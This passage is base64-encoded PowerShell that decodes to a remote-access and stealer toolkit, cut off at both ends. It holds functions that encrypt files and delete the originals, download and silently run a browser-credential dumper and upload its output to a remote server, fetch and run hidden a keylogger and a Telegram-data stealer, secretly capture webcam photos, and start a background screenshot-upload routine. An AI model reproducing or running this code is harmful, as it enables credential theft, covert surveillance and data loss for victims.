2FsdCA9IFtieXRlW11dQChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTb21lUmFuZG9tU2FsdCIpKQogICAgJGl0ZXJhdGlvbnMgPSAxMDAwMAogICAgJGtleUxlbmd0aCA9IDMyICAjIEFFUy0yNTYKICAgICRpdkxlbmd0aCA9IDE2ICAgIyBBRVMgYmxvY2sgc2l6ZSAoMTI4IGJpdHMpCgogICAgIyBEZXJpdmluZyB0aGUga2V5IGFuZCBJViBmcm9tIHRoZSBwYXNzd29yZAogICAgJGtleURlcml2YXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmZjMjg5OERlcml2ZUJ5dGVzKCRwYXNzd29yZCwgJHNhbHQsICRpdGVyYXRpb25zKQogICAgJGFlc0tleSA9ICRrZXlEZXJpdmF0aW9uLkdldEJ5dGVzKCRrZXlMZW5ndGgpCiAgICAkYWVzSVYgPSAka2V5RGVyaXZhdGlvbi5HZXRCeXRlcygkaXZMZW5ndGgpCgogICAgIyBLZWVwIG9yaWdpbmFsIGV4dGVuc2lvbiBhbmQgYWRkICIuZW5jIgogICAgJGVuY3J5cHRlZEZpbGVQYXRoID0gIiRmaWxlUGF0aC5lbmMiCgogICAgdHJ5IHsKICAgICAgICAkYWVzID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCkKICAgICAgICAkYWVzLktleSA9ICRhZXNLZXkKICAgICAgICAkYWVzLklWID0gJGFlc0lWCiAgICAgICAgJGVuY3J5cHRvciA9ICRhZXMuQ3JlYXRlRW5jcnlwdG9yKCRhZXMuS2V5LCAkYWVzLklWKQoKICAgICAgICAjIE9wZW4gaW5wdXQvb3V0cHV0IHN0cmVhbXMKICAgICAgICAkZmlsZVN0cmVhbSA9IFtTeXN0ZW0uSU8uRmlsZV06Ok9wZW5SZWFkKCRmaWxlUGF0aCkKICAgICAgICAkZW5jcnlwdGVkU3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6Q3JlYXRlKCRlbmNyeXB0ZWRGaWxlUGF0aCkKICAgICAgICAkY3J5cHRvU3RyZWFtID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNyeXB0b1N0cmVhbSgkZW5jcnlwdGVkU3RyZWFtLCAkZW5jcnlwdG9yLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DcnlwdG9TdHJlYW1Nb2RlXTo6V3JpdGUpCgogICAgICAgICMgUmVhZCAmIHdyaXRlIGluIGNodW5rcwogICAgICAgICRidWZmZXIgPSBOZXctT2JqZWN0IGJ5dGVbXSAxMDI0CiAgICAgICAgd2hpbGUgKCgkYnl0ZXNSZWFkID0gJGZpbGVTdHJlYW0uUmVhZCgkYnVmZmVyLCAwLCAkYnVmZmVyLkxlbmd0aCkpIC1ndCAwKSB7CiAgICAgICAgICAgICRjcnlwdG9TdHJlYW0uV3JpdGUoJGJ1ZmZlciwgMCwgJGJ5dGVzUmVhZCkKICAgICAgICB9CgogICAgICAgICRjcnlwdG9TdHJlYW0uQ2xvc2UoKQogICAgICAgICRmaWxlU3RyZWFtLkNsb3NlKCkKICAgICAgICAkZW5jcnlwdGVkU3RyZWFtLkNsb3NlKCkKCiAgICAgICAgIyBPcHRpb25hbGx5IHJlbW92ZSB0aGUgb3JpZ2luYWwgZmlsZQogICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICRmaWxlUGF0aCAtRm9yY2UKCiAgICAgICAgcmV0dXJuICJGaWxlIGVuY3J5cHRlZCBzdWNjZXNzZnVsbHk6ICRlbmNyeXB0ZWRGaWxlUGF0aCIKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICByZXR1cm4gIkVycm9yIGR1cmluZyBlbmNyeXB0aW9uOiAkXyIKICAgIH0KfQoKZnVuY3Rpb24gRGVjcnlwdC1GaWxlV2l0aFBhc3N3b3JkIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aAogICAgKQoKICAgICRwYXNzd29yZCA9ICJLQUtTREZLQUtTSkpGTjEyMWtrayMjIzEyNDkwMTAyMDQ5MTltbG1rYWtza2Zua2xhOTk5OSkpPz8iCgogICAgIyBHZW5lcmF0ZSBBRVMga2V5IGFuZCBJViBmcm9tIHRoZSBwYXNzd29yZCB1c2luZyBQQktERjIKICAgICRzYWx0ID0gW2J5dGVbXV1AKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIlNvbWVSYW5kb21TYWx0IikpCiAgICAkaXRlcmF0aW9ucyA9IDEwMDAwCiAgICAka2V5TGVuZ3RoID0gMzIgICMgQUVTLTI1NgogICAgJGl2TGVuZ3RoID0gMTYgICAjIEFFUyBibG9jayBzaXplICgxMjggYml0cykKCiAgICAjIERlcml2aW5nIHRoZSBrZXkgYW5kIElWIGZyb20gdGhlIHBhc3N3b3JkCiAgICAka2V5RGVyaXZhdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SZmMyODk4RGVyaXZlQnl0ZXMoJHBhc3N3b3JkLCAkc2FsdCwgJGl0ZXJhdGlvbnMpCiAgICAkYWVzS2V5ID0gJGtleURlcml2YXRpb24uR2V0Qnl0ZXMoJGtleUxlbmd0aCkKICAgICRhZXNJViA9ICRrZXlEZXJpdmF0aW9uLkdldEJ5dGVzKCRpdkxlbmd0aCkKCiAgICAkZGVjcnlwdGVkRmlsZVBhdGggPSAkZmlsZVBhdGggLXJlcGxhY2UgJ1wuZW5jJCcsICcnCgogICAgdHJ5IHsKICAgICAgICAkYWVzID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCkKICAgICAgICAkYWVzLktleSA9ICRhZXNLZXkKICAgICAgICAkYWVzLklWID0gJGFlc0lWCiAgICAgICAgJGRlY3J5cHRvciA9ICRhZXMuQ3JlYXRlRGVjcnlwdG9yKCRhZXMuS2V5LCAkYWVzLklWKQoKICAgICAgICAjIE9wZW4gdGhlIGVuY3J5cHRlZCBmaWxlIGZvciByZWFkaW5nIGFuZCBjcmVhdGUgYSBuZXcgZmlsZSBmb3Igd3JpdGluZyB0aGUgZGVjcnlwdGVkIGRhdGEKICAgICAgICAkZW5jcnlwdGVkU3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6T3BlblJlYWQoJGZpbGVQYXRoKQogICAgICAgICRkZWNyeXB0ZWRTdHJlYW0gPSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuV3JpdGUoJGRlY3J5cHRlZEZpbGVQYXRoKQogICAgICAgICRjcnlwdG9TdHJlYW0gPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ3J5cHRvU3RyZWFtKCRlbmNyeXB0ZWRTdHJlYW0sICRkZWNyeXB0b3IsIFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNyeXB0b1N0cmVhbU1vZGVdOjpSZWFkKQoKICAgICAgICAjIEJ1ZmZlciBmb3IgcmVhZGluZyBhbmQgd3JpdGluZyBkYXRhCiAgICAgICAgJGJ1ZmZlciA9IE5ldy1PYmplY3QgYnl0ZVtdIDEwMjQKICAgICAgICAkYnl0ZXNSZWFkID0gMAogICAgICAgIHdoaWxlICgoJGJ5dGVzUmVhZCA9ICRjcnlwdG9TdHJlYW0uUmVhZCgkYnVmZmVyLCAwLCAkYnVmZmVyLkxlbmd0aCkpIC1ndCAwKSB7CiAgICAgICAgICAgICRkZWNyeXB0ZWRTdHJlYW0uV3JpdGUoJGJ1ZmZlciwgMCwgJGJ5dGVzUmVhZCkKICAgICAgICB9CgogICAgICAgICRjcnlwdG9TdHJlYW0uQ2xvc2UoKQogICAgICAgICRlbmNyeXB0ZWRTdHJlYW0uQ2xvc2UoKQogICAgICAgICRkZWNyeXB0ZWRTdHJlYW0uQ2xvc2UoKQoKICAgICAgICAjIFJlbW92ZSB0aGUgZW5jcnlwdGVkIGZpbGUgYWZ0ZXIgZGVjcnlwdGlvbgogICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICRmaWxlUGF0aCAtRm9yY2UKCiAgICAgICAgcmV0dXJuICJGaWxlIGRlY3J5cHRlZCBzdWNjZXNzZnVsbHk6ICRkZWNyeXB0ZWRGaWxlUGF0aCIKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICByZXR1cm4gIkVycm9yIGR1cmluZyBkZWNyeXB0aW9uOiAkXyIKICAgIH0KfQoKZnVuY3Rpb24gRmV0Y2gtQnJvd3NlckRhdGEgewogICAgIyBSdW4gdGhlIGR1bXAgKyB1cGxvYWQgZnVsbHkgaW4gYmFja2dyb3VuZCwgaGlkZGVuLCBhc3luYwoKICAgICRzY3JpcHQgPSB7CiAgICAgICAgJE91dHB1dFBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6VEVNUCwgInJlc3VsdC50eHQiKQoKICAgICAgICAjIERvd25sb2FkIGFuZCBwcmVwYXJlIHRoZSBzY3JpcHQKICAgICAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcjAwdC0zeHAxMGl0L3JlZHBpbGwvbWFpbi9saWIvRGV2aWNlR3VhcmQvSW52b2tlLVdEaWdlc3QucHMxIiAtT3V0RmlsZSAiJEVudjpUTVBcSW52b2tlLVdEaWdlc3QucHMxIgogICAgICAgIFVuYmxvY2stRmlsZSAtUGF0aCAiJEVudjpUTVBcSW52b2tlLVdEaWdlc3QucHMxIgoKICAgICAgICAjIFJ1biB0aGUgc2NyaXB0IHNpbGVudGx5LCByZWRpcmVjdCBvdXRwdXQgdG8gZmlsZQogICAgICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICJwb3dlcnNoZWxsLmV4ZSIgLUFyZ3VtZW50TGlzdCAiLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgYCIkRW52OlRNUFxJbnZva2UtV0RpZ2VzdC5wczFgIiAtYmFubmVyIGZhbHNlIC13ZGlnZXN0IGZhbHNlIC1icm93c2VyY3JlZHMiIC1XaW5kb3dTdHlsZSBIaWRkZW4gLVdhaXQgLVJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgJE91dHB1dFBhdGgKCiAgICAgICAgIyBSZW1vdmUgdGVtcCBzY3JpcHQKICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAiJEVudjpUTVBcSW52b2tlLVdEaWdlc3QucHMxIiAtRm9yY2UKCiAgICAgICAgIyBTZW5kIHRoZSBmaWxlIHRvIHRoZSBzZXJ2ZXIKICAgICAgICAjIFJlLWltcG9ydCBTZW5kLVRlbGVncmFtRmlsZSBmdW5jdGlvbiB0byB0aGlzIHJ1bnNwYWNlIChvciByZWRlZmluZSBpdCBoZXJlKQogICAgICAgIGZ1bmN0aW9uIFNlbmQtVGVsZWdyYW1GaWxlIHsKICAgICAgICAgICAgcGFyYW0oW3N0cmluZ10kZmlsZVBhdGgpCgogICAgICAgICAgICAkU0VSVkVSX1VSTCA9ICJodHRwczovL3hlbnYxLTlndmQub25yZW5kZXIuY29tIgogICAgICAgICAgICBpZiAoLW5vdCAoW1N5c3RlbS5JTy5QYXRoXTo6SXNQYXRoUm9vdGVkKCRmaWxlUGF0aCkpKSB7CiAgICAgICAgICAgICAgICAkZmlsZVBhdGggPSBKb2luLVBhdGggLVBhdGggKEdldC1Mb2NhdGlvbikuUGF0aCAtQ2hpbGRQYXRoICRmaWxlUGF0aAogICAgICAgICAgICB9CgogICAgICAgICAgICAkdXJpID0gIiRTRVJWRVJfVVJML2ZpbGVzIgogICAgICAgICAgICAkZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkZmlsZVBhdGgpCiAgICAgICAgICAgICRib3VuZGFyeSA9IFtTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpCiAgICAgICAgICAgICRMRiA9ICJgcmBuIgoKICAgICAgICAgICAgJGZpbGVDb250ZW50ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRmaWxlUGF0aCkKCiAgICAgICAgICAgICRmaWVsZHMgPSAoCiAgICAgICAgICAgICAgICAiLS0kYm91bmRhcnkkTEYiICsKICAgICAgICAgICAgICAgICJDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9YCJkb2N1bWVudGAiOyBmaWxlbmFtZT1gIiRmaWxlTmFtZWAiJExGIiArCiAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0kTEYkTEYiCiAgICAgICAgICAgICkKCiAgICAgICAgICAgICRlbmRCb3VuZGFyeSA9ICIkTEYtLSRib3VuZGFyeS0tJExGIgogICAgICAgICAgICAkYm9keUJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJGZpZWxkcykgKyAkZmlsZUNvbnRlbnQgKyBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkZW5kQm91bmRhcnkpCgogICAgICAgICAgICAkcmVxdWVzdCA9IFtTeXN0ZW0uTmV0Lkh0dHBXZWJSZXF1ZXN0XTo6Q3JlYXRlKCR1cmkpCiAgICAgICAgICAgICRyZXF1ZXN0Lk1ldGhvZCA9ICJQT1NUIgogICAgICAgICAgICAkcmVxdWVzdC5Db250ZW50VHlwZSA9ICJtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0kYm91bmRhcnkiCiAgICAgICAgICAgICRyZXF1ZXN0LkNvbnRlbnRMZW5ndGggPSAkYm9keUJ5dGVzLkxlbmd0aAoKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0gPSAkcmVxdWVzdC5HZXRSZXF1ZXN0U3RyZWFtKCkKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uV3JpdGUoJGJvZHlCeXRlcywgMCwgJGJvZHlCeXRlcy5MZW5ndGgpCiAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtLkNsb3NlKCkKCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSAkcmVxdWVzdC5HZXRSZXNwb25zZSgpCiAgICAgICAgICAgICAgICAkcmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJHJlc3BvbnNlLkdldFJlc3BvbnNlU3RyZWFtKCkpCiAgICAgICAgICAgICAgICAkcmVhZGVyLlJlYWRUb0VuZCgpIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgICRyZWFkZXIuQ2xvc2UoKQogICAgICAgICAgICB9IGNhdGNoIHt9CiAgICAgICAgfQoKICAgICAgICBTZW5kLVRlbGVncmFtRmlsZSAtZmlsZVBhdGggJE91dHB1dFBhdGgKICAgIH0KCiAgICAjIFN0YXJ0IHRoZSBiYWNrZ3JvdW5kIGpvYgogICAgU3RhcnQtSm9iIC1TY3JpcHRCbG9jayAkc2NyaXB0IHwgT3V0LU51bGwKICAgICMgRG9udCB3YWl0IGZvciBpdCAtIHRoaXMgaXMgYXN5bmMKfQoKZnVuY3Rpb24gRmV0Y2gtdGVsZWdyYW0tZGF0YSB7CiAgICAjIERlZmluZSB0aGUgVVJMIHdoZXJlIHRoZSBrZXlsb2dnZXIgc2NyaXB0IGlzIGhvc3RlZAogICAgJHVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vd2FnbmVyMDEyL3dhZ25lci9yZWZzL2hlYWRzL21haW4vdGQucHMxIgoKICAgICMgRGVmaW5lIHRoZSBwYXRoIHdoZXJlIHdlIHdpbGwgc2F2ZSB0aGUgZmlsZQogICAgJHRlbXBQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkZW52OlRFTVAsICJ0ZXN0LnBzMSIpCgogICAgIyBEb3dubG9hZCB0aGUgZmlsZSB0byB0aGUgdGVtcCBwYXRoCiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJHRlbXBQYXRoCgogICAgIyBSdW4gdGhlIGRvd25sb2FkZWQgZmlsZSBzaWxlbnRseSAoaW4gdGhlIGJhY2tncm91bmQpCiAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1Bcmd1bWVudExpc3QgIi1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlIGAiJHRlbXBQYXRoImAgLVdpbmRvd1N0eWxlIEhpZGRlbgp9CgpmdW5jdGlvbiBTdGFydC1LZXlsb2dnZXIgewogICAgIyBEZWZpbmUgdGhlIFVSTCB3aGVyZSB0aGUga2V5bG9nZ2VyIHNjcmlwdCBpcyBob3N0ZWQKICAgICR1cmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dhZ25lcjAxMi93YWduZXIvcmVmcy9oZWFkcy9tYWluL2tleS5wczEiCgogICAgIyBEZWZpbmUgdGhlIHBhdGggd2hlcmUgd2Ugd2lsbCBzYXZlIHRoZSBmaWxlCiAgICAkdGVtcFBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6VEVNUCwgInRlc3QucHMxIikKCiAgICAjIERvd25sb2FkIHRoZSBmaWxlIHRvIHRoZSB0ZW1wIHBhdGgKICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkdGVtcFBhdGgKCiAgICAjIFJ1biB0aGUgZG93bmxvYWRlZCBmaWxlIHNpbGVudGx5IChpbiB0aGUgYmFja2dyb3VuZCkKICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbC5leGUgLUFyZ3VtZW50TGlzdCAiLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgYCIkdGVtcFBhdGgiYCAtV2luZG93U3R5bGUgSGlkZGVuCn0KCmZ1bmN0aW9uIFN0b3AtS2V5bG9nZ2VyIHsKICAgICMgR2V0IGFsbCBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2Vzc2VzCiAgICAkcHNQcm9jZXNzZXMgPSBHZXQtUHJvY2VzcyBwb3dlcnNoZWxsIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCgogICAgZm9yZWFjaCAoJHByb2MgaW4gJHBzUHJvY2Vzc2VzKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgIyBDaGVjayBpZiB0aGUgY29tbWFuZCBsaW5lIGNvbnRhaW5zICJ0ZXN0LnBzMSIKICAgICAgICAgICAgJGNvbW1hbmRMaW5lID0gKEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIlByb2Nlc3NJZCA9ICQoJHByb2MuSWQpIikuQ29tbWFuZExpbmUKICAgICAgICAgICAgaWYgKCRjb21tYW5kTGluZSAtbGlrZSAiKnRlc3QucHMxKiIpIHsKICAgICAgICAgICAgICAgIFN0b3AtUHJvY2VzcyAtSWQgJHByb2MuSWQgLUZvcmNlCiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgIyBIYW5kbGUgYWNjZXNzIGVycm9ycyBzaWxlbnRseQogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gV2ViY2FtQ2FwdHVyZSB7CiAgICAkdGVtcERpciA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBQYXRoKCkKICAgICRleGVVcmwgPSAiaHR0cHM6Ly9naXRodWIuY29tL3dhZ25lcjAxMi93YWduZXIvcmF3L3JlZnMvaGVhZHMvbWFpbi90ZXN0LmV4ZSIKICAgICRkbGwxVXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS93YWduZXIwMTIvd2FnbmVyL3Jhdy9yZWZzL2hlYWRzL21haW4vQUZvcmdlLlZpZGVvLmRsbCIKICAgICRkbGwyVXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS93YWduZXIwMTIvd2FnbmVyL3Jhdy9yZWZzL2hlYWRzL21haW4vQUZvcmdlLlZpZGVvLkRpcmVjdFNob3cuZGxsIgoKICAgICRleGVQYXRoID0gSm9pbi1QYXRoICR0ZW1wRGlyICJ0ZXN0LmV4ZSIKICAgICRkbGwxUGF0aCA9IEpvaW4tUGF0aCAkdGVtcERpciAiQUZvcmdlLlZpZGVvLmRsbCIKICAgICRkbGwyUGF0aCA9IEpvaW4tUGF0aCAkdGVtcERpciAiQUZvcmdlLlZpZGVvLkRpcmVjdFNob3cuZGxsIgoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJGV4ZVBhdGgpKSB7IEludm9rZS1XZWJSZXF1ZXN0ICRleGVVcmwgLU91dEZpbGUgJGV4ZVBhdGggfQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkZGxsMVBhdGgpKSB7IEludm9rZS1XZWJSZXF1ZXN0ICRkbGwxVXJsIC1PdXRGaWxlICRkbGwxUGF0aCB9CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRkbGwyUGF0aCkpIHsgSW52b2tlLVdlYlJlcXVlc3QgJGRsbDJVcmwgLU91dEZpbGUgJGRsbDJQYXRoIH0KCiAgICAkY2FwdHVyZWRJbWFnZVBhdGggPSBKb2luLVBhdGggJHRlbXBEaXIgInBob3RvLmpwZyIKICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRleGVQYXRoIC1Xb3JraW5nRGlyZWN0b3J5ICR0ZW1wRGlyIC1XaW5kb3dTdHlsZSBIaWRkZW4gLVdhaXQKCiAgICBpZiAoVGVzdC1QYXRoICRjYXB0dXJlZEltYWdlUGF0aCkgewogICAgICAgIFNlbmQtVGVsZWdyYW1GaWxlIC1maWxlUGF0aCAkY2FwdHVyZWRJbWFnZVBhdGgKICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAkY2FwdHVyZWRJbWFnZVBhdGggLUZvcmNlCiAgICB9Cn0KCmZ1bmN0aW9uIENhcHR1cmUtQW5kLVNlbmQtU2NyZWVuc2hvdCB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kU0VSVkVSX1VSTAogICAgKQoKICAgICMgQ3JlYXRlIGEgbmV3IHJ1bnNwYWNlIGZvciBiYWNrZ3JvdW5kIGV4ZWN1dGlvbgogICAgJHJ1bnNwYWNlID0gW1J1bnNwYWNlRmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlKCkKICAgICRydW5zcGFjZS5PcGVuKCkKCiAgICAkcHMgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkcHMuUnVuc3BhY2UgPSAkcnVuc3BhY2UKCiAgICAkcHMuQWRkU2NyaXB0KHsKCiAgICAgICAgcGFyYW0oJFNFUlZFUl9VUkwpCgogICAgICAgIGZ1bmN0aW9uIFNlbmQtVGVsZWdyYW1GaWxlIHsKICAgICAgICAgICAgcGFyYW0oW3N0cmluZ10kZmlsZVBhdGgpCgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKC1ub3QgKFtTeXN0ZW0uSU8uUGF0aF06OklzUGF0aFJvb3RlZCgkZmlsZVBhdGgpKSkgewogICAgICAgICAgICAgICAgICAgICRmaWxlUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAoR2V0LUxvY2F0aW9uKS5QYXRoIC1DaGlsZFBhdGggJGZpbGVQYXRoCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJHVyaSA9ICIkU0VSVkVSX1VSTC9maWxlcyIKICAgICAgICAgICAgICAgICRmaWxlTmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCRmaWxlUGF0aCkKICAgICAgICAgICAgICAgICRib3VuZGFyeSA9IFtTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpCiAgICAgICAgICAgICAgICAkTEYgPSAiYHJgbiIKCiAgICAgICAgICAgICAgICAkZmlsZUNvbnRlbnQgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJGZpbGVQYXRoKQoKICAgICAgICAgICAgICAgICRmaWVsZHMgPSAoCiAgICAgICAgICAgICAgICAgICAgIi0tJGJvdW5kYXJ5JExGIiArCiAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1gImRvY3VtZW50YCI7IGZpbGVuYW1lPWAiJGZpbGVOYW1lYCIkTEYiICsKICAgICAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0kTEYkTEYiCiAgICAgICAgICAgICAgICApCgogICAgICAgICAgICAgICAgJGVuZEJvdW5kYXJ5ID0gIiRMRi0tJGJvdW5kYXJ5LS0kTEYiCiAgICAgICAgICAgICAgICAkYm9keUJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJGZpZWxkcykgKyAkZmlsZUNvbnRlbnQgKyBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkZW5kQm91bmRhcnkpCgogICAgICAgICAgICAgICAgJHJlcXVlc3QgPSBbU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF06OkNyZWF0ZSgkdXJpKQogICAgICAgICAgICAgICAgJHJlcXVlc3QuTWV0aG9kID0gIlBPU1QiCiAgICAgICAgICAgICAgICAkcmVxdWVzdC5Db250ZW50VHlwZSA9ICJtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0kYm91bmRhcnkiCiAgICAgICAgICAgICAgICAkcmVxdWVzdC5Db250ZW50TGVuZ3RoID0gJGJvZHlCeXRlcy5MZW5ndGgKCiAgICAgICAgICAgICAgICAkcmVxdWVzdFN0cmVhbSA9ICRyZXF1ZXN0LkdldFJlcXVlc3RTdHJlYW0oKQogICAgICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uV3JpdGUoJGJvZHlCeXRlcywgMCwgJGJvZHlCeXRlcy5MZW5ndGgpCiAgICAgICAgICAgICAgICAkcmVxdWVzdFN0cmVhbS5DbG9zZSgpCgogICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gJHJlcXVlc3QuR2V0UmVzcG9uc2UoKQogICAgICAgICAgICAgICAgJHJlYWRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKCRyZXNwb25zZS5HZXRSZXNwb25zZVN0cmVhbSgpKQogICAgICAgICAgICAgICAgJHJlYWRlci5SZWFkVG9FbmQoKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAkcmVhZGVyLkNsb3NlKCkKICAgICAgICAgICAgfSBjYXRjaCB7fQogICAgICAgIH0KCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwogICAgICAgICAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nCgogICAgICAgICAgICAjIFNldCBwcm9jZXNzIERQSSBhd2FyZW5lc3MKICAgICAgICAgICAgJGRwaUF3YXJlQ29kZSA9IEAiCnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIGNsYXNzIE5hdGl2ZU1ldGhvZHMgewogICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRQcm9jZXNzRFBJQXdhcmUoKTsKfQoiQAogICAgICAgICAgICBBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJGRwaUF3YXJlQ29kZQogICAgICAgICAgICBbTmF0aXZlTWV0aG9kc106OlNldFByb2Nlc3NEUElBd2FyZSgpIHwgT3V0LU51bGwKCiAgICAgICAgICAgICMgQ2FwdHVyZSBzY3JlZW5zaG90CiAgICAgICAgICAgICRib3VuZHMgPSBbU3lzdGVtLldpbmRvd3MuRm9ybXMuU2NyZWVuXTo6UHJpbWFyeVNjcmVlbi5Cb3VuZHMKICAgICAgICAgICAgJGJpdG1hcCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuQml0bWFwICRib3VuZHMuV2lkdGgsICRib3VuZHMuSGVpZ2h0CiAgICAgICAgICAgICRncmFwaGljcyA9IFtTeXN0ZW0uRHJhd2luZy5HcmFwaGljc106OkZyb21JbWFnZSgkYml0bWFwKQogICAgICAgICAgICAkZ3JhcGhpY3MuQ29weUZyb21TY3JlZW4oW1N5c3RlbS5EcmF3aW5nLlBvaW50XTo6RW1wdHksIFtTeXN0ZW0uRHJhd2luZy5Qb2ludF06OkVtcHR5LCAkYml0bWFwLlNpemUpCgogICAgICAgICAgICAkdGltZXN0YW1wID0gR2V0LURhdGUgLUZvcm1hdCAneXl5eU1NZGRfSEhtbXNzJwogICAgICAgICAgICAkdGVtcEZpbGUgPSBKb2luLVBhdGggLVBhdGggKFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBQYXRoKCkpIC1DaGlsZFBhdGggInNjcmVlbnNob3RfJHRpbWVzdGFtcC5wbmciC